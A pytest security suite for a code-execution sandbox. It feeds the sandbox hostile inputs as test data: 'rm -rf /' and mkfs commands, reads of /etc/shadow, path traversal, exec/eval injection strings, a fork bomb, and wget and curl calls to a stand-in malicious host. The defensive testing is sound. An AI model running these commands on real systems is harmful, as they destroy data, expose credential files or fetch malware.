"""
Comprehensive security tests for the Swiss Sandbox system.

This module tests all security aspects including command validation,
code analysis, resource limits, isolation, and attack prevention.
"""

import pytest
import asyncio
import tempfile
import os
from pathlib import Path

from src.sandbox.unified_server import UnifiedSandboxServer
from src.sandbox.core.types import ServerConfig, SecurityLevel
from src.sandbox.core.security import SecurityManager


@pytest.mark.security
class TestCommandSecurityValidation:
    """Test command security validation."""
    
    @pytest.fixture
    def security_server(self, temp_dir):
        """Create a server with high security for testing."""
        config = ServerConfig(
            security_level=SecurityLevel.HIGH,
            max_execution_time=10,
            max_memory_mb=256,
            artifacts_dir=temp_dir / "artifacts",
            workspaces_dir=temp_dir / "workspaces",
            logs_dir=temp_dir / "logs"
        )
        return UnifiedSandboxServer(config)
    
    async def test_safe_commands_allowed(self, security_server, security_test_cases):
        """Test that safe commands are allowed."""
        for command in security_test_cases['safe_commands']:
            result = await security_server._execute_shell_tool(
                command=command,
                workspace_id="safe_command_test"
            )
            
            # Command should either succeed or fail for non-security reasons
            if not result['success']:
                # If it fails, it shouldn't be due to security
                error = result.get('error', '').lower()
                assert 'security' not in error, f"Safe command blocked by security: {command}"
                assert 'violation' not in error, f"Safe command blocked by security: {command}"
    
    async def test_dangerous_commands_blocked(self, security_server, security_test_cases):
        """Test that dangerous commands are blocked."""
        for command in security_test_cases['dangerous_commands']:
            result = await security_server._execute_shell_tool(
                command=command,
                workspace_id="dangerous_command_test"
            )
            
            # Command should be blocked
            assert not result['success'], f"Dangerous command allowed: {command}"
            
            error = result.get('error', '').lower()
            assert any(keyword in error for keyword in ['security', 'violation', 'blocked', 'denied']), \
                f"Command not blocked by security: {command}, error: {result.get('error')}"
    
    async def test_python_code_security(self, security_server, security_test_cases):
        """Test Python code security validation."""
        # Safe Python code should work
        result = await security_server._execute_python_tool(
            code=security_test_cases['safe_python'],
            workspace_id="python_security_test"
        )
        
        assert result['success'], f"Safe Python code blocked: {result.get('error')}"
        
        # Dangerous Python code should be blocked
        result = await security_server._execute_python_tool(
            code=security_test_cases['dangerous_python'],
            workspace_id="python_security_test"
        )
        
        assert not result['success'], "Dangerous Python code allowed"
        error = result.get('error', '').lower()
        assert any(keyword in error for keyword in ['security', 'violation', 'blocked']), \
            f"Python code not blocked by security: {result.get('error')}"
    
    async def test_file_system_access_restrictions(self, security_server):
        """Test file system access restrictions."""
        # Test accessing system directories
        system_access_tests = [
            "import os; os.listdir('/etc')",
            "import os; os.listdir('/root')",
            "import os; os.listdir('/sys')",
            "open('/etc/passwd', 'r').read()",
            "open('/etc/shadow', 'r').read()",
        ]
        
        for code in system_access_tests:
            result = await security_server._execute_python_tool(
                code=code,
                workspace_id="filesystem_security_test"
            )
            
            # Should either be blocked by security or fail due to permissions
            if not result['success']:
                # This is expected - either security block or permission denied
                continue
            else:
                # If it succeeds, it should be because the files don't exist
                # or access is properly sandboxed
                assert "FileNotFoundError" in result.get('error', '') or \
                       "PermissionError" in result.get('error', '') or \
                       result['success'], f"System access not properly restricted: {code}"
    
    async def test_network_access_restrictions(self, security_server):
        """Test network access restrictions."""
        # Test various network operations
        network_tests = [
            "import urllib.request; urllib.request.urlopen('http://malicious.com')",
            "import socket; socket.socket().connect(('malicious.com', 80))",
            "import subprocess; subprocess.run(['curl', 'http://malicious.com'])",
            "import os; os.system('wget http://malicious.com/malware.sh')",
        ]
        
        for code in network_tests:
            result = await security_server._execute_python_tool(
                code=code,
                workspace_id="network_security_test"
            )
            
            # Network access should be controlled
            # Either blocked by security or fail due to network restrictions
            if not result['success']:
                # This is expected
                continue
            else:
                # If it succeeds, verify it's not actually making dangerous connections
                # (might succeed due to network being unavailable, etc.)
                pass
    
    async def test_subprocess_restrictions(self, security_server):
        """Test subprocess execution restrictions."""
        subprocess_tests = [
            "import subprocess; subprocess.run(['rm', '-rf', '/'])",
            "import subprocess; subprocess.run(['sudo', 'rm', '-rf', '/'])",
            "import subprocess; subprocess.run(['mkfs', '/dev/sda1'])",
            "import os; os.system('rm -rf /')",
            "import os; os.popen('sudo rm -rf /').read()",
        ]
        
        for code in subprocess_tests:
            result = await security_server._execute_python_tool(
                code=code,
                workspace_id="subprocess_security_test"
            )
            
            # Dangerous subprocess calls should be blocked
            assert not result['success'], f"Dangerous subprocess allowed: {code}"
            error = result.get('error', '').lower()
            assert any(keyword in error for keyword in ['security', 'violation', 'blocked']), \
                f"Subprocess not blocked by security: {code}"


@pytest.mark.security
class TestResourceLimitSecurity:
    """Test resource limit enforcement for security."""
    
    async def test_memory_limit_enforcement(self, security_server):
        """Test memory limit enforcement."""
        # Try to allocate excessive memory
        memory_bomb_code = """
import numpy as np

# Try to allocate way more memory than allowed
try:
    # This should fail due to memory limits
    huge_array = np.zeros((100000, 100000))  # ~80GB
    print("Memory bomb succeeded - this is bad!")
except MemoryError:
    print("Memory limit enforced - good!")
except Exception as e:
    print(f"Other error (acceptable): {e}")
"""
        
        result = await security_server._execute_python_tool(
            code=memory_bomb_code,
            workspace_id="memory_limit_test"
        )
        
        # Should either succeed with memory limit message or fail due to limits
        if result['success']:
            assert "Memory limit enforced" in result['output'] or \
                   "Other error" in result['output'], \
                   "Memory bomb not properly limited"
        else:
            # Failure is also acceptable if memory limits prevent execution
            pass
    
    async def test_cpu_time_limit_enforcement(self, security_server):
        """Test CPU time limit enforcement."""
        # Infinite loop that should be terminated
        cpu_bomb_code = """
import time

print("Starting CPU-intensive operation...")
start_time = time.time()

# This should be terminated by timeout
counter = 0
while True:
    counter += 1
    if counter % 1000000 == 0:
        elapsed = time.time() - start_time
        print(f"Still running after {elapsed:.1f}s, counter: {counter}")
        if elapsed > 60:  # Safety break
            break

print("CPU bomb completed - this should not happen")
"""
        
        start_time = asyncio.get_event_loop().time()
        result = await security_server._execute_python_tool(
            code=cpu_bomb_code,
            workspace_id="cpu_limit_test"
        )
        end_time = asyncio.get_event_loop().time()
        
        execution_time = end_time - start_time
        
        # Should be terminated by timeout
        assert not result['success'], "CPU bomb not terminated"
        assert execution_time < 15, f"CPU bomb ran too long: {execution_time:.1f}s"
        
        error = result.get('error', '').lower()
        assert 'timeout' in error, f"CPU bomb not terminated by timeout: {result.get('error')}"
    
    async def test_file_size_limits(self, security_server):
        """Test file size limit enforcement."""
        # Try to create very large file
        large_file_code = """
import os

try:
    # Try to create a very large file
    with open('large_file.txt', 'w') as f:
        for i in range(1000000):  # Try to write 1M lines
            f.write(f"This is line {i} with some content to make it longer\\n")
    
    file_size = os.path.getsize('large_file.txt')
    print(f"Created large file: {file_size} bytes")
    
    if file_size > 100 * 1024 * 1024:  # 100MB
        print("Large file creation succeeded - might be a problem")
    else:
        print("File size seems reasonable")
        
except Exception as e:
    print(f"Large file creation failed: {e}")
"""
        
        result = await security_server._execute_python_tool(
            code=large_file_code,
            workspace_id="file_size_test"
        )
        
        # Should either succeed with reasonable file size or fail due to limits
        if result['success']:
            # Check if file size is reasonable
            if "Large file creation succeeded - might be a problem" in result['output']:
                pytest.fail("File size limits not enforced")
        # Failure is acceptable if file size limits prevent creation


@pytest.mark.security
class TestIsolationSecurity:
    """Test workspace and process isolation security."""
    
    async def test_workspace_isolation(self, security_server):
        """Test that workspaces are properly isolated."""
        # Set secret in workspace 1
        result1 = await security_server._execute_python_tool(
            code="SECRET_KEY = 'workspace1_secret_key_12345'",
            workspace_id="isolation_workspace1"
        )
        assert result1['success']
        
        # Try to access secret from workspace 2
        result2 = await security_server._execute_python_tool(
            code="""
try:
    print(f"Accessed secret: {SECRET_KEY}")
    print("ISOLATION BREACH!")
except NameError:
    print("Secret not accessible - isolation working")
except Exception as e:
    print(f"Other error: {e}")
""",
            workspace_id="isolation_workspace2"
        )
        
        assert result2['success']
        assert "Secret not accessible - isolation working" in result2['output']
        assert "ISOLATION BREACH!" not in result2['output']
    
    async def test_file_system_isolation(self, security_server):
        """Test file system isolation between workspaces."""
        # Create file in workspace 1
        result1 = await security_server._execute_python_tool(
            code="""
with open('secret_file.txt', 'w') as f:
    f.write('This is a secret file from workspace 1')
print("Secret file created in workspace 1")
""",
            workspace_id="fs_isolation_workspace1"
        )
        assert result1['success']
        
        # Try to access file from workspace 2
        result2 = await security_server._execute_python_tool(
            code="""
import os

try:
    with open('secret_file.txt', 'r') as f:
        content = f.read()
    print(f"ISOLATION BREACH: {content}")
except FileNotFoundError:
    print("File not accessible - isolation working")
except Exception as e:
    print(f"Other error: {e}")

# List files to see what's available
files = os.listdir('.')
print(f"Available files: {files}")
""",
            workspace_id="fs_isolation_workspace2"
        )
        
        assert result2['success']
        assert "File not accessible - isolation working" in result2['output']
        assert "ISOLATION BREACH:" not in result2['output']
    
    async def test_environment_variable_isolation(self, security_server):
        """Test environment variable isolation."""
        # Set environment variable in workspace 1
        result1 = await security_server._execute_python_tool(
            code="""
import os
os.environ['SECRET_ENV_VAR'] = 'secret_value_12345'
print(f"Set environment variable: {os.environ.get('SECRET_ENV_VAR')}")
""",
            workspace_id="env_isolation_workspace1"
        )
        assert result1['success']
        
        # Try to access environment variable from workspace 2
        result2 = await security_server._execute_python_tool(
            code="""
import os

secret_value = os.environ.get('SECRET_ENV_VAR')
if secret_value:
    print(f"ISOLATION BREACH: {secret_value}")
else:
    print("Environment variable not accessible - isolation working")

# Show available environment variables (filtered)
env_vars = {k: v for k, v in os.environ.items() if 'SECRET' in k}
print(f"Secret environment variables: {env_vars}")
""",
            workspace_id="env_isolation_workspace2"
        )
        
        assert result2['success']
        assert "Environment variable not accessible - isolation working" in result2['output']
        assert "ISOLATION BREACH:" not in result2['output']


@pytest.mark.security
class TestAttackPrevention:
    """Test prevention of various attack vectors."""
    
    async def test_code_injection_prevention(self, security_server):
        """Test prevention of code injection attacks."""
        # Test various code injection attempts
        injection_tests = [
            "exec('import os; os.system(\"rm -rf /\")')",
            "eval('__import__(\"os\").system(\"rm -rf /\")')",
            "__import__('os').system('rm -rf /')",
            "getattr(__builtins__, 'exec')('import os; os.system(\"rm -rf /\")')",
            "compile('import os; os.system(\"rm -rf /\")', '<string>', 'exec')",
        ]
        
        for injection_code in injection_tests:
            result = await security_server._execute_python_tool(
                code=injection_code,
                workspace_id="injection_test"
            )
            
            # Should be blocked by security
            assert not result['success'], f"Code injection not prevented: {injection_code}"
            error = result.get('error', '').lower()
            assert any(keyword in error for keyword in ['security', 'violation', 'blocked']), \
                f"Code injection not blocked by security: {injection_code}"
    
    async def test_import_restrictions(self, security_server):
        """Test restrictions on dangerous imports."""
        # Test dangerous imports
        dangerous_imports = [
            "import ctypes; ctypes.cdll.LoadLibrary('libc.so.6')",
            "import subprocess; subprocess.run(['rm', '-rf', '/'])",
            "from ctypes import *",
            "import sys; sys.exit()",
            "__import__('ctypes')",
        ]
        
        for import_code in dangerous_imports:
            result = await security_server._execute_python_tool(
                code=import_code,
                workspace_id="import_restriction_test"
            )
            
            # Should either be blocked or fail safely
            if not result['success']:
                # This is expected
                continue
            else:
                # If it succeeds, it should not cause system damage
                # (might succeed if the dangerous operation is sandboxed)
                pass
    
    async def test_path_traversal_prevention(self, security_server):
        """Test prevention of path traversal attacks."""
        # Test path traversal attempts
        traversal_tests = [
            "open('../../../etc/passwd', 'r').read()",
            "open('../../../../etc/shadow', 'r').read()",
            "import os; os.listdir('../../../')",
            "with open('../../../../../../etc/hosts', 'r') as f: f.read()",
        ]
        
        for traversal_code in traversal_tests:
            result = await security_server._execute_python_tool(
                code=traversal_code,
                workspace_id="traversal_test"
            )
            
            # Should either be blocked or fail due to sandboxing
            if not result['success']:
                # This is expected
                continue
            else:
                # If it succeeds, it should not access system files
                # (might succeed if properly sandboxed)
                assert "root:" not in result.get('output', ''), \
                    f"Path traversal succeeded: {traversal_code}"
    
    async def test_resource_exhaustion_prevention(self, security_server):
        """Test prevention of resource exhaustion attacks."""
        # Test fork bomb prevention
        fork_bomb_code = """
import os
import sys

def fork_bomb():
    while True:
        try:
            pid = os.fork()
            if pid == 0:
                fork_bomb()
        except OSError:
            print("Fork failed - resource limits working")
            break

print("Starting fork bomb test...")
fork_bomb()
print("Fork bomb completed")
"""
        
        result = await security_server._execute_python_tool(
            code=fork_bomb_code,
            workspace_id="fork_bomb_test"
        )
        
        # Should be blocked or fail due to resource limits
        if result['success']:
            assert "resource limits working" in result['output'] or \
                   "Fork failed" in result['output'], \
                   "Fork bomb not prevented"
        else:
            # Failure is acceptable if fork is blocked entirely
            pass


@pytest.mark.security
class TestSecurityAuditing:
    """Test security auditing and logging."""
    
    async def test_security_violation_logging(self, security_server):
        """Test that security violations are properly logged."""
        # Trigger a security violation
        result = await security_server._execute_python_tool(
            code="import os; os.system('rm -rf /')",
            workspace_id="audit_test"
        )
        
        assert not result['success'], "Security violation not blocked"
        
        # Check that violation was logged (this would depend on implementation)
        # For now, just verify the error contains security information
        error = result.get('error', '').lower()
        assert any(keyword in error for keyword in ['security', 'violation', 'blocked']), \
            "Security violation not properly reported"
    
    async def test_security_status_reporting(self, security_server):
        """Test security status reporting."""
        # Get server status
        status = await security_server._get_server_status_tool()
        
        assert 'security_level' in status
        assert status['security_level'] == SecurityLevel.HIGH.value
        
        # Should include security-related information
        assert 'status' in status
        assert status['status'] in ['healthy', 'warning', 'error']


@pytest.mark.security
class TestSecurityLevels:
    """Test different security levels."""
    
    async def test_low_security_level(self, temp_dir):
        """Test behavior with low security level."""
        config = ServerConfig(
            security_level=SecurityLevel.LOW,
            artifacts_dir=temp_dir / "artifacts",
            workspaces_dir=temp_dir / "workspaces",
            logs_dir=temp_dir / "logs"
        )
        server = UnifiedSandboxServer(config)
        
        # Some operations that might be blocked in high security should work
        result = await server._execute_python_tool(
            code="import subprocess; print('Subprocess import allowed')",
            workspace_id="low_security_test"
        )
        
        # Should succeed in low security (but actual subprocess calls might still be restricted)
        assert result['success'], "Low security level too restrictive"
    
    async def test_critical_security_level(self, temp_dir):
        """Test behavior with critical security level."""
        config = ServerConfig(
            security_level=SecurityLevel.CRITICAL,
            artifacts_dir=temp_dir / "artifacts",
            workspaces_dir=temp_dir / "workspaces",
            logs_dir=temp_dir / "logs"
        )
        server = UnifiedSandboxServer(config)
        
        # Even basic operations might be restricted
        result = await server._execute_python_tool(
            code="import json; print('JSON import allowed')",
            workspace_id="critical_security_test"
        )
        
        # Should either succeed (if JSON is safe) or be blocked
        if not result['success']:
            error = result.get('error', '').lower()
            assert 'security' in error, "Failure not due to security in critical mode"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])